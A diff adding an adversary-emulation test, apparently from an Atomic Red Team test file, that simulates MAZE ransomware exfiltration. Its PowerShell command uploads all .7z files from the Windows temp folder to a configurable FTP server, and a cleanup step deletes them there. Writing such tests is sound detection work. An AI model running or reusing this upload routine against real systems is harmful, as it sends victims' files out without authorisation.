@@ -116,3 +116,46 @@ atomic_tests:
       description: SMTP server to use for email transportation
       type: String
       default: "127.0.0.1"
+- name: MAZE FTP Upload
+  auto_generated_guid: 57799bc2-ad1e-4130-a793-fb0c385130ba
+  description: |
+    This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.
+    Upon successful execution, all 7z files within the %windir%\temp directory will be uploaded to a remote FTP server. 
+    Reference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents
+  supported_platforms:
+  - windows
+  input_arguments:
+    ftp_server:
+      description: FTP Server address
+      type: String
+      default: 127.0.0.1
+    username:
+      description: Username for FTP server login
+      type: String
+      default:
+    password:
+      description: Password for FTP server login
+      type: String
+      default:
+  executor:
+    command: |
+      $Dir_to_copy = "$env:windir\temp"
+      $ftp = "ftp://#{ftp_server}/"
+      $web_client = New-Object System.Net.WebClient
+      $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')
+      if (test-connection -count 1 -computername "#{ftp_server}" -quiet)
+      {foreach($file in (dir $Dir_to_copy "*.7z"))
+      {echo "Uploading $file..."
+      $uri = New-Object System.Uri($ftp+$file.name)
+      $web_client.UploadFile($uri, $file.FullName)}}
+      else
+      {echo "FTP Server Unreachable. Please verify the server address in input args and try again."}
+    cleanup_command: |
+     $ftp = "ftp://#{ftp_server}/"
+     try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
+     {$uri = New-Object System.Uri($ftp+$file.name)
+      $ftp_del = [System.Net.FtpWebRequest]::create($uri)
+      $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')
+      $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
+      $ftp_del.GetResponse()}} catch{}
+    name: powershell
